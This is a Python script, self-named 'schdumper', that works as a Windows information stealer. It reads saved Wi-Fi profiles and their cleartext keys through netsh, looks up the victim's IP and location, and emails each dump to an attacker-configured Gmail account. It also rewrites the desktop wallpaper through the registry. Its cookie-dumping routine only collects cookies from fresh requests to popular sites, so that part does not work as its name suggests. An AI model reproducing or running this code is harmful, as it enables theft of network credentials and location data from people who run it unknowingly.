import subprocess 
import re
import smtplib
import ssl
from email.message import EmailMessage
import os
import sqlite3
import requests
import json
import win32crypt
import os
from tabulate import tabulate
from urllib.request import urlopen


#welcome to schdumper
#wilkommen aus die schdumper
#viteje ve schdumper


#MODIFY THESE STRINGS WITH YOUR CREDENTIALS
email_sender = ''
email_password = ''
email_receiver = ''

def bg():
    os.system('start cmd /k reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "bg.bmp" /f')
    os.system('RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True')

def cookies():
    global email_sender
    global email_receiver
    global email_password

    urls = [ "https://www.youtube.com", "https://www.instagram.com", "https://www.twitch.tv", "https://twitter.com", "https://github.com", "https://mail.google.com", "https://store.steampowered.com", "https://discord.com", "https://www.facebook.com", "https://vk.com", "https://web.whatsapp.com", "https://www.hbomax.com", "https://www.disneyplus.com", "https://www.netflix.com", "https://www.reddit.com", "https://www.amazon.com", "https://www.shopify.com", "https://www.shopier.com", "https://open.spotify.com", "https://www.pinterest.com"]

    for url in urls:
        s = requests.session()
        s.get(url)
        cookies = s.cookies.get_dict()

        subject = "sch's cookie dump"
        body = f"""
            {cookies}
        """

        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())

def skiddy_ip():
    global data
    url = "https://ipinfo.io/json"
    response = urlopen(url)
    data = json.load(response)
    subject = "sch's ip dump"
    body = f"""
        {data}
    """

    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())

def wifi():
    global email_sender
    global email_receiver
    global email_password
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["passwd"] = None
                else:
                    wifi_profile["passwd"] = password[1]
                wifi_list.append(wifi_profile) 

    for x in range(len(wifi_list)):
        subject = "sch's wifi dump"
        body = f"""
            {wifi_list[x]}
        """

        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())

cookies()
skiddy_ip()
wifi()
bg()
